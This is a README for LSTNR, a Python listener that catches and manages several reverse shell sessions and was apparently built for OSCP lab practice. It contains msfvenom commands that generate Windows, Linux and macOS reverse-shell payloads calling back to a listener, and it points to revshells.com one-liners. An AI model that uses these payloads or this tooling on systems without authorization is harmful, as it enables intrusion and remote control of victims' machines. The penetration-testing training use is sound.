# LSTNR
Python script that receives reverse shell connections from remote devices. 

Remote devices can be managed from a Command Line Interface (CLI).

![image](https://github.com/user-attachments/assets/7940405c-4b42-4d0f-8556-f05b2d2de7ec)

FYI: Using `rlwrap` will allow your CLI history remain intact while working.

# DISCLAIMER
This is only for testing purposes, not intended for anything illegal. I was testing out ways to manage multiple connections while doing the OSCP labs. #Hobbies

# Download LSTNR

```
git clone github.com/bwithe/LSNTR

cd lstnr
```

# USAGE

1. Start LSTNR
    - `python3 lstnr.py -p <PORT_TO_LISTEN>`
- MENU COMMANDS
    - `ls` : lists connected clients
    - `cs <ID>` : connects to that session
    - `exit` : will terminate all sessions and stop the script
- SESSION COMMANDS
    - `CTRL+C` or `bs` : backgrounds the active session
    - `die` : while in a session will terminate it

2. Have CLIENT connect to LSTNR
    - Best options that work with `lstnr.py`
        - Windows: `msfvenom -p windows/x64/powershell_reverse_tcp LHOST=127.0.0.1 LPORT=21 -f exe -o rev.exe`
        - Windows: `msfvenom -p windows/x64/powershell_reverse_tcp LHOST=127.0.0.1 LPORT=21 -f dll -o rev.dll`
        - Linux: `msfvenom -p linux/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=21 -f elf -o rev.elf`
        - MacOS: `msfvenom -p osx/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=21 -f macho -o rev.macho`
    - You can use any of the methods found on https://www.revshells.com
        - Windows: `Powershell #3 (Base64)`
        - Linux: `Bash -i`
        - MacOS: `python3`

# Screenshot examples:

- Starting the listener

![image](https://github.com/user-attachments/assets/abee3a21-ffc5-4310-9ccb-6e5f3ef3303a)

- Press any key to get a list of commands, or type `?` or `help`

![image](https://github.com/user-attachments/assets/cf0217b8-9f47-47b3-80d7-83f928899839)

- List any active sessions

![image](https://github.com/user-attachments/assets/a9abbfe0-c9a2-4b6a-8f6f-15a0aa7a6cea)

- When a session is established

![image](https://github.com/user-attachments/assets/768bc3be-f7c4-44c3-b634-6d16bb9be7ed)

- Connecting to a session with `cs <id>` will automatically update the sessions table

![image](https://github.com/user-attachments/assets/46ff53b3-3e07-4b48-aa39-6283a11f0092)

- Background a session with `bs` or `CTRL+C`

![image](https://github.com/user-attachments/assets/0c0453f4-6c1d-4a17-a6d2-88ee862aaabc)

- Once you've received other connections, `ls` will always verify

![image](https://github.com/user-attachments/assets/fb10059b-7766-47bf-9caa-4db0e79adb57)

- Example of a Windows machine connected

<img width="711" alt="Screenshot 2025-03-04 at 8 56 27 PM" src="https://github.com/user-attachments/assets/08819944-4c25-4b30-a104-cec389fb44c4" />

- Kill an individual session `die`

![image](https://github.com/user-attachments/assets/38a03884-9b75-4499-93fb-da5b39718ad6)

- To kill all sessions, type `die` at the main menu `lstnr$`

![image](https://github.com/user-attachments/assets/ebbc21c5-5481-4c90-8341-275a9bed6f6b)

- To kill `LSTNR$` and all connections, type `exit`

![image](https://github.com/user-attachments/assets/10ebe05b-c320-4465-ab83-a59b0a7f225e)

- LSTNR also keeps a session and command log

![image](https://github.com/user-attachments/assets/79d08aae-287d-4f66-b9c4-ed97e7f213c7)


# TROUBLESHOOTING
- If a session hangs, background the session with `CTRL+C` and then reconnect.
    - If commands stop working all together, reconnect to the session and exit, then re-run the reverse shell from the client machine.
- If you are having issues please feel free to reach out
